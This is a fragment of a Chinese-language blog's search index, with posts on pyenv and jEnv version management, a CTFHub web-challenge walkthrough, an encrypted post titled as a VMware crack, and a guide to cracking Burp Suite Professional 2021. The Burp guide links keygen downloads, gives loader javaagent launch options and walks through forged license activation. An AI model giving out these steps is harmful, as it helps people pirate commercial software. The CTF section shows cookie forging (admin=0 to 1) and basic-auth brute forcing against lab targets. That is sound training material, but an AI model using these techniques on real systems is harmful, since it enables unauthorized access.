            <tag> Python </tag>
            
            <tag> Pycharm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS下多版本python管理</title>
      <link href="/python/pyenv/"/>
      <url>/python/pyenv/</url>
      
        <content type="html"><![CDATA[<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><blockquote><p>macOS里面是自带python的，但是版本都相对老一点，而且直接对系统本身的python进行操作还是带有一定危险性的。pyenv 是一个强大 Python 包管理工具，可以灵活地切换各种 Python 版本，macOS 下强烈建议大家安装体验一下。</p></blockquote><p>最新系统的macOS的话都是自带python2和python3的，对于python3的话可以通过brew进行安装，然后通过别名的方式去指定安装的版本，从而避免使用系统自带的python3</p><h2 id="Pyenv"><a href="#Pyenv" class="headerlink" title="Pyenv"></a>Pyenv</h2><h3 id="安装pyenv"><a href="#安装pyenv" class="headerlink" title="安装pyenv"></a>安装pyenv</h3><pre class="language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> pyenv</code></pre><ul><li>zsh&#x2F;bash</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'export PYENV_ROOT="$HOME/.pyenv"'</span> <span class="token operator">>></span> ~/.profile<span class="token builtin class-name">echo</span> <span class="token string">'export PATH="$PYENV_ROOT/bin:$PATH"'</span> <span class="token operator">>></span> ~/.profile<span class="token builtin class-name">echo</span> <span class="token string">'eval "$(pyenv init --path)"'</span> <span class="token operator">>></span> ~/.profile</code></pre><h3 id="版本安装"><a href="#版本安装" class="headerlink" title="版本安装"></a>版本安装</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看已经安装的Python版本</span>pyenv versions<span class="token comment"># 查看当前的 Python 版本</span>pyenv version<span class="token comment"># 查看可安装的版本</span>pyenv <span class="token function">install</span> <span class="token parameter variable">-l</span><span class="token comment"># 安装与卸载 python 3.x.x</span>pyenv <span class="token function">install</span> <span class="token number">3</span>.x.xpyenv uninstall <span class="token number">3</span>.x.x</code></pre><p>这里如果（大概率）安装的时候比较卡，可以考虑在终端开代理或者使用proxychains</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">PYTHON_CONFIGURE_OPTS</span><span class="token operator">=</span><span class="token string">"--disable-ipv6"</span> proxychains4 pyenv <span class="token function">install</span> <span class="token operator">&lt;</span>python版本<span class="token operator">></span></code></pre><h3 id="国内加速安装python环境"><a href="#国内加速安装python环境" class="headerlink" title="国内加速安装python环境"></a>国内加速安装python环境</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token number">3.8</span>.6<span class="token punctuation">;</span><span class="token function">wget</span> https://npm.taobao.org/mirrors/python/<span class="token variable">$v</span>/Python-<span class="token variable">$v</span>.tar.xz <span class="token parameter variable">-P</span> ~/.pyenv/cache/<span class="token punctuation">;</span>pyenv <span class="token function">install</span> <span class="token variable">$v</span></code></pre><h3 id="macos-bigsur安装"><a href="#macos-bigsur安装" class="headerlink" title="macos bigsur安装"></a>macos bigsur安装</h3><ol><li>设置 command-line tools<br>打开Xcode.app在Preference &gt; Locations处选择正确版本的command-line tools</li><li>安装python（设置环境变量）<br>直接执行如下命令即可：</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">pyenv <span class="token function">install</span> <span class="token parameter variable">--patch</span> <span class="token number">3.7</span>.1 <span class="token operator">&lt;</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">curl</span> <span class="token parameter variable">-sSL</span> https://github.com/python/cpython/commit/8ea6353.patch<span class="token punctuation">)</span></code></pre><ol start="3"><li>安装python(未设置环境变量)<br>创立一个脚本，注意这里如果不设置脚本直接复制命令执行（zsh）会莫名的报错</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> install_python.sh<span class="token function">chmod</span> +x install_python.sh</code></pre><p>在脚本里输入以下内容</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">set</span> <span class="token parameter variable">-ex</span> <span class="token assign-left variable">CFLAGS</span><span class="token operator">=</span><span class="token string">"-I<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> openssl<span class="token variable">)</span></span>/include -I<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> readline<span class="token variable">)</span></span>/include -I<span class="token variable"><span class="token variable">$(</span>xcrun --show-sdk-path<span class="token variable">)</span></span>/usr/include"</span> <span class="token punctuation">\</span><span class="token assign-left variable">LDFLAGS</span><span class="token operator">=</span><span class="token string">"-L<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> openssl<span class="token variable">)</span></span>/lib -L<span class="token variable"><span class="token variable">$(</span>brew <span class="token parameter variable">--prefix</span> readline<span class="token variable">)</span></span>/lib -L<span class="token variable"><span class="token variable">$(</span>xcrun --show-sdk-path<span class="token variable">)</span></span>/usr/lib -L/usr/local/opt/zlib/lib"</span> <span class="token punctuation">\</span><span class="token assign-left variable">CPPFLAGS</span><span class="token operator">=</span><span class="token string">"-I/usr/local/opt/zlib/include"</span> <span class="token punctuation">\</span><span class="token assign-left variable">PKG_CONFIG_PATH</span><span class="token operator">=</span><span class="token string">"/usr/local/opt/zlib/lib/pkgconfig"</span> <span class="token punctuation">\</span>pyenv <span class="token function">install</span> <span class="token parameter variable">--patch</span> <span class="token number">3.7</span>.1 <span class="token operator">&lt;</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">curl</span> <span class="token parameter variable">-sSL</span> https://github.com/python/cpython/commit/8ea6353.patch<span class="token punctuation">)</span></code></pre><h3 id="手工加速安装"><a href="#手工加速安装" class="headerlink" title="手工加速安装"></a>手工加速安装</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>blog_secgxx<span class="token punctuation">]</span> <span class="token assign-left variable">PYTHON_CONFIGURE_OPTS</span><span class="token operator">=</span><span class="token string">"--disable-ipv6"</span> pyenv <span class="token function">install</span> <span class="token number">3.7</span>.0python-build: use openssl@1.1 from homebrewpython-build: use readline from homebrewDownloading Python-3.7.0.tar.xz<span class="token punctuation">..</span>.-<span class="token operator">></span> https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xzerror: failed to download Python-3.7.0.tar.xzBUILD FAILED <span class="token punctuation">(</span>OS X <span class="token number">11.1</span> using python-build <span class="token number">20180424</span><span class="token punctuation">)</span></code></pre><p>可以看到下载包的时候失败了，实际上这个包如果我们通过浏览器下载的话其实会很快，这个时候就需要手工加速一下</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 新建cache缓存目录</span>➜ <span class="token function">mkdir</span> ~/.pyenv/cache<span class="token comment"># 将下载好的 压缩包 移动到 cache目录下</span>➜ <span class="token function">mv</span> ~/Downloads/Python-3.7.0.tar.xz ~/.pyenv/cache<span class="token comment"># 再次安装 就会很快 秒装了</span>➜ pyenv <span class="token function">install</span> <span class="token number">3.7</span>.0Installing Python-3.7.0<span class="token punctuation">..</span>.Installed Python-3.7.0 to /Users/xxx/.pyenv/versions/Python-3.7.0<span class="token comment"># 安装完成手动清空cache目录</span>➜ <span class="token function">rm</span> <span class="token parameter variable">-rf</span> ~/.pyenv/cache/*zsh: sure you want to delete the only <span class="token function">file</span> <span class="token keyword">in</span> /Users/xxx/.pyenv/cache <span class="token punctuation">[</span>yn<span class="token punctuation">]</span>? y<span class="token comment"># 查看是否安装成功</span>➜ pyenv versions* system <span class="token punctuation">(</span>set by /Users/xxx/.python-version<span class="token punctuation">)</span>  <span class="token number">2.7</span>.18  <span class="token number">3.7</span>.0  <span class="token number">3.8</span>.6  </code></pre><h3 id="版本切换"><a href="#版本切换" class="headerlink" title="版本切换"></a>版本切换</h3><p>pyenv 的 global、local、shell 的优先级关系是：shell &gt; local &gt; global</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># global 全局设置 一般不建议改变全局设置</span>pyenv global <span class="token operator">&lt;</span>python版本<span class="token operator">></span><span class="token comment"># shell 会话设置 只影响当前的shell会话</span>pyenv shell <span class="token operator">&lt;</span>python版本<span class="token operator">></span><span class="token comment"># 取消 shell 会话的设置</span>pyenv shell <span class="token parameter variable">--unset</span><span class="token comment"># local 本地设置 只影响所在文件夹</span>pyenv <span class="token builtin class-name">local</span> <span class="token operator">&lt;</span>python版本<span class="token operator">></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> macOS </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp2021安装配置</title>
      <link href="/sofware/pentest-tool/burpsuite2021/"/>
      <url>/sofware/pentest-tool/burpsuite2021/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文主要记录了macOS平台下关于BurpSuite Pro 2021的安装和使用，其他平台的可以进行参考<br>之前一直使用的是BurpSuite2020.2.1，最近看到许多大佬都开始使用2021版本了而且从国光大佬的文章也了解到新版的burp已经封装好了JDK，这样就可以在不改变现有JAVA环境的情况下使用新Burp了</p></blockquote><h2 id="下载BurpSuite-Professional-2021-4-2"><a href="#下载BurpSuite-Professional-2021-4-2" class="headerlink" title="下载BurpSuite Professional 2021.4.2"></a>下载BurpSuite Professional 2021.4.2</h2><p>现在官网已经开放了下载链接：</p><ul><li>Burp Suite Professional 2021.4.2</li></ul><table><thead><tr><th>平台</th><th>下载链接</th></tr></thead><tbody><tr><td>JAR</td><td><a href="https://portswigger.net/burp/releases/download?product=pro&version=2021.4.2&type=Jar">https://portswigger.net/burp/releases/download?product=pro&amp;version=2021.4.2&amp;type=Jar</a></td></tr><tr><td>Linux (64-bit)</td><td><a href="https://portswigger.net/burp/releases/download?product=pro&version=2021.4.2&type=Linux">https://portswigger.net/burp/releases/download?product=pro&amp;version=2021.4.2&amp;type=Linux</a></td></tr><tr><td>Mac OSX</td><td><a href="https://portswigger.net/burp/releases/download?product=pro&version=2021.4.2&type=MacOsx">https://portswigger.net/burp/releases/download?product=pro&amp;version=2021.4.2&amp;type=MacOsx</a></td></tr><tr><td>Windows (64-bit)</td><td><a href="https://portswigger.net/burp/releases/download?product=pro&version=2021.4.2&type=WindowsX64">https://portswigger.net/burp/releases/download?product=pro&amp;version=2021.4.2&amp;type=WindowsX64</a></td></tr></tbody></table><h2 id="安装BurpSuite-Professional-2021-4-2"><a href="#安装BurpSuite-Professional-2021-4-2" class="headerlink" title="安装BurpSuite Professional 2021.4.2"></a>安装BurpSuite Professional 2021.4.2</h2><h3 id="Mac-OS-X-安装包版本"><a href="#Mac-OS-X-安装包版本" class="headerlink" title="Mac OS X 安装包版本"></a>Mac OS X 安装包版本</h3><p>下载好安装包以后就根据提示一步一步安装就好，这里因为我已经安装过了所以会有一步额外的提示。后续更新burp的话选择第一个yes即可更新。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210507111919.png" alt="Burp安装包"></p><h3 id="JAR包版本"><a href="#JAR包版本" class="headerlink" title="JAR包版本"></a>JAR包版本</h3><p>下载好即可，需要12以上的JDK来启动</p><h3 id="下载注册机并设置启动参数"><a href="#下载注册机并设置启动参数" class="headerlink" title="下载注册机并设置启动参数"></a>下载注册机并设置启动参数</h3><p>这里提供<a href="https://www.sqlsec.com/">国光大佬</a>的下载地址和我的百度云备用地址</p><table><thead><tr><th>文件名</th><th>下载链接</th><th>备用下载地址</th></tr></thead><tbody><tr><td>macOS Burpsuite.zip （文件大小：995.9 K）</td><td><a href="https://sqlsec.lanzoux.com/im9eUj08a1i">蓝奏云</a></td><td><a href="https://pan.baidu.com/s/19vD3aZc5BWM3RQVx4ywSVw">百度云</a> 提取码:bk4s</td></tr></tbody></table><p>注册机的文件一共有3个，全部复制到应用目录下即可。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210507155459.png" alt="20210507155459"></p><p>macOS可以通过终端打开Burp内置的JAVA文件路径，Windows、Linux同理</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /Applications/Burp<span class="token punctuation">\</span> Suite<span class="token punctuation">\</span> Professional.app/Contents/java/app <span class="token operator">&amp;&amp;</span> <span class="token function">open</span> <span class="token builtin class-name">.</span></code></pre><h4 id="安装包版本启动参数设置"><a href="#安装包版本启动参数设置" class="headerlink" title="安装包版本启动参数设置"></a>安装包版本启动参数设置</h4><p>复制完成注册机以后需要设置启动参数,在刚刚打开的目录的上上级目录下有名为<code>vmoptions.txt</code>的文件，在这里编辑启动参数。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210507160137.png" alt="20210507160137"></p><ul><li>汉化启动</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-noverify</span><span class="token parameter variable">-javaagent:BurpSuiteLoader.jar</span><span class="token parameter variable">-javaagent:BurpSuiteCn.jar</span><span class="token parameter variable">-Dfile.encoding</span><span class="token operator">=</span>utf-8<span class="token parameter variable">-XX:MaxRAMPercentage</span><span class="token operator">=</span><span class="token number">50</span>-include-options user.vmoptions</code></pre><ul><li>英文原版启动</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-noverify</span><span class="token parameter variable">-javaagent:BurpSuiteLoader.jar</span><span class="token parameter variable">-XX:MaxRAMPercentage</span><span class="token operator">=</span><span class="token number">50</span>-include-options user.vmoptions</code></pre><p>选择自己想要启动方式编辑完成后保存并推出就完成了，需要注意的是一定要通过注册机启动，不然和谐就失效了。</p><h4 id="jar包版本启动参数设置"><a href="#jar包版本启动参数设置" class="headerlink" title="jar包版本启动参数设置"></a>jar包版本启动参数设置</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">burpsuite</span><span class="token operator">=</span><span class="token string">'cd /Applications/Burp\ Suite\ Professional.app/Contents/java/app &amp;&amp; java -noverify -javaagent:BurpSuiteLoader.jar --illegal-access=permit -jar burpsuite_pro.jar'</span></code></pre><p>这里因为采用的是jdk16，所以需要额外加入参数<code>--illegal-access=permit</code>其他版本请自行删除</p><h3 id="激活BurpSuite"><a href="#激活BurpSuite" class="headerlink" title="激活BurpSuite"></a>激活BurpSuite</h3><p>如果之前没有激活过Brup的同学可需要输入许可证密钥，运行如下命令打开注册机。（之前激活过的就可以直接打开，忽略后续步骤了）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x /Applications/Burp<span class="token punctuation">\</span> Suite<span class="token punctuation">\</span> Professional.app/Contents/java/app/license_key.sh <span class="token operator">&amp;&amp;</span> <span class="token function">sh</span> /Applications/Burp<span class="token punctuation">\</span> Suite<span class="token punctuation">\</span> Professional.app/Contents/java/app/license_key.sh</code></pre><p>注册步骤简单描述一下：<br>首先将<code>License</code>复制到Burp的许可证密钥框中，然后点击<code>Next</code></p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210507162058.png" alt="20210507162058"><br>然后选择手动激活<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210507162900.png" alt="20210507162900"></p><p>然乎点击Burp里面的「辅助请求」按钮，将信息粘贴到注册机中的 「Activation Request」中，此时注册机会在「Activation Response」生成返回信息，然后将这个返回信息粘贴到Burp中，点击「粘贴响应」按钮即可，最后点击「下一个」<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210507163013.png" alt="20210507163013"><br>最后如果没有意外的话就注册成功了</p><p>如果还有其他问题的话，作为一个要用burp的同学，那么让我帮你百度一下：</p><p><a href="https://t.cn/A67W2Jvd">让我帮你百度一下 Burpsuite如何激活</a></p><h2 id="Windows快速启动配置"><a href="#Windows快速启动配置" class="headerlink" title="Windows快速启动配置"></a>Windows快速启动配置</h2><p>有关Burpsuite的下载激活等操作请参考<a href="https://www.secgxx.com/software/pentest/burpsuite/burpsuite2021formacos/">macOS Burp2021安装配置</a></p><p>这里仅给出快速启动的vbs脚本配置,创建*.vbs，将以下内容输入，保存后放到Burpsuite的安装目录即可</p><ul><li>注册机</li></ul><pre class="language-vbs" data-language="vbs"><code class="language-vbs">CreateObject(&quot;WScript.Shell&quot;).Run &quot;.&#x2F;jre\bin\java.exe -noverify -jar BurpSuiteLoader.jar&quot;,0</code></pre><ul><li>英文原版启动</li></ul><pre class="language-vbs" data-language="vbs"><code class="language-vbs">CreateObject(&quot;WScript.Shell&quot;).Run &quot;.&#x2F;jre\bin\java.exe -noverify -javaagent:BurpSuiteLoader.jar -jar BurpSuite_Professional.jar&quot;,0</code></pre><ul><li>汉化启动</li></ul><pre class="language-vbs" data-language="vbs"><code class="language-vbs">CreateObject(&quot;WScript.Shell&quot;).Run &quot;.&#x2F;jre\bin\java.exe -noverify -javaagent:BurpSuiteLoader.jar -javaagent:BurpSuiteCn.jar -Dfile.encoding&#x3D;utf-8 -jar BurpSuite_Professional.jar&quot;,0</code></pre><p>如果采用的是jar包的话需要自行配置好jdk以及更换vbs脚本的<code>java.exe</code>路径</p><p>如果想要美化一下vbs脚本图标的话，右键创建快捷方式，点击下方的更换图标，更改为burp的图标即可。这里不过多赘述。</p><hr><p>参考链接：</p><ol><li><a href="https://www.sqlsec.com/2019/11/macbp.html#toc-heading-7">https://www.sqlsec.com/2019/11/macbp.html#toc-heading-7</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
            <tag> Burpsuite </tag>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS下多版本JDK管理</title>
      <link href="/java/macmultiversion/"/>
      <url>/java/macmultiversion/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这里一般用Oracle JDK ，OpenJDK没有用过所以就不做介绍了，后续如果用到了会水一篇新的文章</p></blockquote><h2 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h2><p>Oracle JDK的安装的话一般分为<a href="https://www.oracle.com/java/technologies/javase-downloads.html">官方下载</a>和通过<code>homebrew</code>进行安装</p><p>官方链接目前提供8、11、16三个版本的下载。想下载6的话需要去<a href="https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html">另一个链接</a>下载</p><p>使用<code>homebrew</code>进行安装的话分为以下两种情况（brew会安装openjdk）：</p><ul><li>安装最新版的JDK<pre class="language-bash" data-language="bash"><code class="language-bash">brew cask <span class="token function">install</span> <span class="token function">java</span></code></pre></li><li>安装指定版本的JDK <pre class="language-bash" data-language="bash"><code class="language-bash">brew tap homebrew/cask-versionsbrew search <span class="token function">java</span>brew <span class="token function">install</span> java*</code></pre>然后根据搜索的结果进行安装</li></ul><h2 id="查看JDK安装路径"><a href="#查看JDK安装路径" class="headerlink" title="查看JDK安装路径"></a>查看JDK安装路径</h2>   <pre class="language-bash" data-language="bash"><code class="language-bash">/usr/libexec/java_home <span class="token parameter variable">-V</span></code></pre><p>  <img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210507090926.png" alt="20210507090926"><br>  如图，这里安装了java8和java16</p><h2 id="多版本JDK管理-jEnv"><a href="#多版本JDK管理-jEnv" class="headerlink" title="多版本JDK管理-jEnv"></a>多版本JDK管理-jEnv</h2><blockquote><p>jEnv的官网介绍说:”jEnv is a command line tool to help you forget how to set the JAVA_HOME environment variable” 一个帮助你忘却配置环境变量的工具</p></blockquote><h3 id="下载jEnv"><a href="#下载jEnv" class="headerlink" title="下载jEnv"></a>下载jEnv</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#git</span><span class="token function">git</span> clone https://github.com/jenv/jenv.git ~/.jenv<span class="token comment">#homebrew</span>brew <span class="token function">install</span> jenv</code></pre><h3 id="安装jEnv"><a href="#安装jEnv" class="headerlink" title="安装jEnv"></a>安装jEnv</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'export PATH="$HOME/.jenv/bin:$PATH"'</span> <span class="token operator">>></span> ~/.zshrc<span class="token builtin class-name">echo</span> <span class="token string">'eval "$(jenv init -)"'</span> <span class="token operator">>></span> ~/.zshrc</code></pre><h3 id="配置jEnv"><a href="#配置jEnv" class="headerlink" title="配置jEnv"></a>配置jEnv</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc/usr/libexec/java_home <span class="token parameter variable">-V</span>jenv <span class="token function">add</span> java_home</code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210507101244.png" alt="20210507101244"></p><h3 id="使用jEnv"><a href="#使用jEnv" class="headerlink" title="使用jEnv"></a>使用jEnv</h3><p>jEnv常用的有三个参数global、local、shell<br>这里推荐用local按照目录进行管理，使用了local命令以后会在目录下生成一个<code>.java-version</code>的文件，只要不删除该文件，当前目录会使用采用文件配置的java版本<br>List managed JDKs</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ jenv versions  system  oracle64-1.6.0.39* oracle64-1.7.0.11 <span class="token punctuation">(</span>set by /Users/hikage/.jenv/version<span class="token punctuation">)</span></code></pre><p>Configure global version</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ jenv global oracle64-1.6.0.39</code></pre><p>Configure local version (per directory)</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ jenv <span class="token builtin class-name">local</span> oracle64-1.6.0.39</code></pre><p>Configure shell instance version</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ jenv shell oracle64-1.6.0.39</code></pre><hr><p>参考链接：</p><ol><li>MacOS 下安装多个版本的 JDK 并统一管理:<a href="https://segmentfault.com/a/1190000020083040">https://segmentfault.com/a/1190000020083040</a></li><li>jEnv: <a href="https://www.jenv.be/">https://www.jenv.be/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> macOS </tag>
            
            <tag> Java </tag>
            
            <tag> 多版本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub-技能树</title>
      <link href="/ctf/practice/ctfhub-skilltree/"/>
      <url>/ctf/practice/ctfhub-skilltree/</url>
      
        <content type="html"><![CDATA[<h2 id="Web前置技能"><a href="#Web前置技能" class="headerlink" title="Web前置技能"></a>Web前置技能</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><p>这个技能主要是考验对于HTTP方法的理解,打开题目，可以看到页面提示<code>「Use CTF**B Method，I will give you flag」</code>，因此抓包把请求方法更改为<code>CTFHUB</code>即可获取flag。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95.jpg" alt="请求方法"></p><p>直接利用Burpsuite修改请求方法，获取flag<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95flag.jpg" alt="请求方法flag"></p><h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210626111830.png" alt="20210626111830"><br>直接访问，发现没有flag，点击<code>Give me Flag</code>也么得反应，这里其实根据题目提示，可以猜想到，flag是隐藏在302的跳转包中。</p><p>于是打开burpsuite进行抓包，果然，获取了flag<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210626112128.png" alt="20210626112128"></p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>打开这个技能树可以看到系统提示了“Cookie 欺骗 伪造”，访问题目地址，可以看到系统提示了<code>only admin can get flag</code><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210626114824.png" alt="20210626114824"><br>那么思路就很清楚了，我们要用admin的身份去访问才可以获取flag，抓包发现在Cookie中出现了字段<code>admin=0</code> <br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210626114904.png" alt="20210626114904"><br>所以我们尝试将admin字段的值修改为1，发现成功获取flag<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210626115002.png" alt="20210626115002"></p><h4 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h4><p>打开题目我们可以看到这道题就是考401认证爆破的，题目附件是一份字典<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210629145553.png" alt="20210629145553"><br>首先根据响应包中的提示，我们确定用户名为<code>admin</code><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210629145815.png" alt="20210629145815"><br>而401认证的字段是在http头部，设置爆破<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210629145931.png" alt="20210629145931"><br>然后设置Payload，设置如下所示：</p><ul><li>Payload type：Custom iterator</li><li>Payload Options：Position1：<code>admin:</code> ，Position2：<code>加载题目提供的密码字典</code></li><li>Payload Processing：Base64-encode</li><li>Payload Encoding：取消勾选Url-encode</li></ul><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210629151529.png" alt="20210629151529"></p><p>然后点击爆破就可以了，根据返回长度排个序就可以获取flag了<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210629151222.png" alt="20210629151222"></p><h4 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h4>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctfhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware和谐</title>
      <link href="/sofware/vmware/"/>
      <url>/sofware/vmware/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="58f2b76ae42e321594a6ed149d11c0661462f9fff13a2cfb3a1a3ff469af641b">07f94501e737b22c9f19bf6c98896d02592366d7acdb95a2c26cb9c042f8247b3a82ba0bcffab179add23b698582f5f094e9ab858a1f46514e2f667254aced17b36f99026bd46bfd933483488406da73802286c2d918e5b9b558773ae18f4f7a5c98416f28ab859ee090f8102a3170582a75f1ca0bf5a33ea501793241d1029d90709ecff02097a0ef131e92a0c1f618846c341ea57b858d70dab3a1ba10ec122c3f4ddc5c2317166f077c09b316af2ebc0b0448f11da67aadcb37106921fbee8b26e2a06232c90a80f0376f38efbb369f4dcaab9e1a4c8bd2f7c0dc27f9380fdad029066427210e2eb4248c39b5b975bffdb4ae87172a7e5d81c7be58d40e93126b62d7dd07bc91d3ad037cd7d06cebce7c51cf4ffd8c3ac5893c8b44771d5177717aaa5a9501d1a92c23c894e9cadf6f27ab658fc5a75ef9268e68a2ab3258326c4967c072d0689a9eb9d40bbe2151fb889c08626ef38b706f07d8e5d6676cef9f19c575ee358f3c5697bc757a0e8d41567f1ddf435a4e6c7a9bafcc83637c488b31a870c6159cd1736f589beca2fb2ba434167d161aae6b1da98f0d2cd345b72d87bd71edd1c777988ba5d8467720028f03d922ea5aa9d5293370d1483895429c30bc06886c778fa7dbd87ad33e3983f2c6b99c03cc05ad09b7342e6ce555f14b52a1dccf495636a452a0af500d71307f9ce7312bb76d50b41d5b22c5028d1e9aa1e7010136ee62a91bd4a5d17589579086465b7d38fafc03fd56c323b16b79002e6178649e0ef8de3b73652f52080ff9d9470734e8aa0aae5f9e57addf3c1a4bfd6a88d950e5373670a4dce8ac274bea59745cb9fa5d748e7a01c41710093b682847a2fbd1a505687c012d689c39ed2632ffcabb75cd8a0e297e4d591c10276dd94563d051d0aea6a1e39936f4717e5b48f07f0de7f6846dee9e6ef089f4c4ec5d65ad58b8705526f26cec9ec7f759b8f077bb7084ee520282e475f3eb0dbf1f78b9a3bd119b15c926cbf0720e8f8455a157b963034a7d8f490eb958d659c79d1f2305cf3057b4892c4c5b3751ad492a8ef839e53446ed18a98006baa6fcbcbb745b52ead97a3f40a17c30824b39974e4713dc9eb216fe5e7490e1d542bf912d0f981a07c7397274f217abd4efa6be9d7fa35ef721fd08f4b4aeed9957fa0c274aa475e51a2b120ca90ceefb99dc2a853951565d41d2ab00109bd93669ca37cfdeb63728b19fd790b22bdd15e1279ccc770bd267f4d594bf19caf96ace89bf0a511fbbf51b95ab5bd00c5453f90fc775011a0c2326185f411b71c7a971cb54320cb304344a6984e807c195644cc93dd8364c3502044ed73f75952d171b6295a64122bf87af7799b6a738f248b96ca3436eebd4bbbb95fce5b04c7f9415eb81f8d160709c57c752df89dd921b4beb87d4781be68846beff9e07a866b8e811c2b1798f318e0d27590e9e62d211377bf1754c4e1f09afe92f07c99097c439e7fff15a10ce652b1da359d84045bdcdd1c99d77c87025ed38955bcac0f6a4595a18b4aac08cbb9a634b4e6348217bfa2c4be4ae341c3fd7bb269b62d3f909ba0853c385810b065b54a35e3e5e8a1feccfdbfa7608678fcabe8f989ea8a0f08d7ff5536412d7439da16aeb157f8acd2bd2c9592a44421a8affe58718fcba83be9f474669847f772745a2d313baee2ab09dfc8601578958d25865395eda4305e7059dfa35bc9b54d1f0514382dd70a8ec76f835ac5cf51ea20c2dabcda84adc6538eed0c00d01db542cfb9f636e54514885487e8f0df57d784aae04415eb14f83796ca0152521e0f044b017ba64335cc473fa4df7423d94a16f81f4299c550850238771b18de1f0180b91495a5d5022800a1c48009579